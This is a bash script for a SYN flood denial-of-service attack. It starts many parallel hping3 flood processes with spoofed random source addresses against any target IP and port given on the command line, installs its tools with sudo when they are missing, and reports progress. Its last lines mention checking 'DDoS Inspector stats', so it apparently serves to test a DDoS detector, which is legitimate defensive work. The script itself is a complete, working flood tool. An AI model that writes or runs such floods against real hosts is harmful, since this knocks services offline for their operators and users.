#!/bin/bash

# Efficient SYN Flood Attack Script
# Uses more efficient methods to generate high packet rates

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

TARGET_IP=${1:-"127.0.0.1"}
TARGET_PORT=${2:-"80"}
DURATION=${3:-"30"}
INTENSITY=${4:-"high"}

echo -e "${GREEN}[START] Efficient SYN Flood Attack${NC}"
echo "    Target: $TARGET_IP:$TARGET_PORT"
echo "    Duration: ${DURATION}s"
echo "    Intensity: $INTENSITY"

case $INTENSITY in
    "low")
        RATE=100       # 100 packets/sec
        PARALLEL=2
        ;;
    "medium") 
        RATE=1000      # 1000 packets/sec
        PARALLEL=5
        ;;
    "high")
        RATE=5000      # 5000 packets/sec
        PARALLEL=10
        ;;
    "extreme")
        RATE=10000     # 10000 packets/sec
        PARALLEL=20
        ;;
esac

echo -e "${CYAN}[PARAMETERS] Attack Configuration:${NC}"
echo "    - Rate: $RATE packets/second"
echo "    - Parallel processes: $PARALLEL" 
echo "    - Total packets: $((RATE * DURATION))"
echo ""

# Function to send efficient SYN flood using hping3 with burst mode
send_syn_flood_burst() {
    local process_id=$1
    local packets_per_process=$((RATE / PARALLEL))
    local packets_per_second=$((packets_per_process))
    
    echo "    Process $process_id: Sending $packets_per_second packets/sec"
    
    # Use hping3 in flood mode with count and interval
    # -i u1000 = 1000 microseconds = 1ms interval = 1000 pps max per process
    local interval_us=$((1000000 / packets_per_second))
    if [ $interval_us -lt 1000 ]; then
        interval_us=1000  # Minimum 1ms interval for stability
    fi
    
    # Run attack for specified duration
    timeout $DURATION hping3 -S -p $TARGET_PORT --flood --rand-source -i u$interval_us $TARGET_IP >/dev/null 2>&1 &
    
    return $!
}

# Alternative method using nmap for comparison
send_syn_flood_nmap() {
    local process_id=$1
    echo "    Process $process_id: Using nmap SYN scan method"
    
    # Use nmap with timing template for fast scanning
    for ((i=0; i<DURATION; i++)); do
        timeout 1 nmap -sS -T5 --min-rate $((RATE/PARALLEL/DURATION)) -p $TARGET_PORT $TARGET_IP >/dev/null 2>&1 &
        sleep 1
    done
}

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo -e "${YELLOW}[WARNING] hping3 not found. Installing...${NC}"
    sudo apt-get update && sudo apt-get install -y hping3
fi

# Check if nmap is installed
if ! command -v nmap &> /dev/null; then
    echo -e "${YELLOW}[WARNING] nmap not found. Installing...${NC}"
    sudo apt-get update && sudo apt-get install -y nmap
fi

echo -e "${BLUE}[ATTACK] Starting efficient SYN flood attack...${NC}"
echo -e "${YELLOW}[TIMING] This will run for $DURATION seconds${NC}"
echo -e "${RED}[METHOD] Using hping3 flood mode for maximum efficiency${NC}"

# Start parallel attack processes
PIDS=()
for ((p=1; p<=PARALLEL; p++)); do
    send_syn_flood_burst $p &
    PIDS+=($!)
done

# Monitor attack progress
start_time=$(date +%s)
echo -e "${CYAN}[MONITORING] Attack progress...${NC}"

while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))
    
    if [ $elapsed -ge $DURATION ]; then
        break
    fi
    
    # Show progress
    remaining=$((DURATION - elapsed))
    estimated_packets=$((RATE * elapsed))
    echo -e "${YELLOW}[PROGRESS] Attack in progress... ${remaining}s remaining (targeting ~$estimated_packets packets)${NC}"
    sleep 2
done

# Clean up background processes
echo -e "${RED}[STOPPING] Stopping attack processes...${NC}"
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null || true
done

# Kill any remaining hping3 processes
pkill -f "hping3.*$TARGET_IP" 2>/dev/null || true
sleep 2

echo -e "${GREEN}[SUCCESS] Efficient SYN flood attack completed${NC}"
echo -e "${CYAN}[STATS] Targeted packets: ~$((RATE * DURATION))${NC}"
echo -e "${BLUE}[CHECK] Check your DDoS Inspector stats for actual detection${NC}"
echo ""
echo -e "${YELLOW}[INFO] This script should generate much higher packet rates${NC}"
echo "       Check the stats file to see if packet counts increased significantly"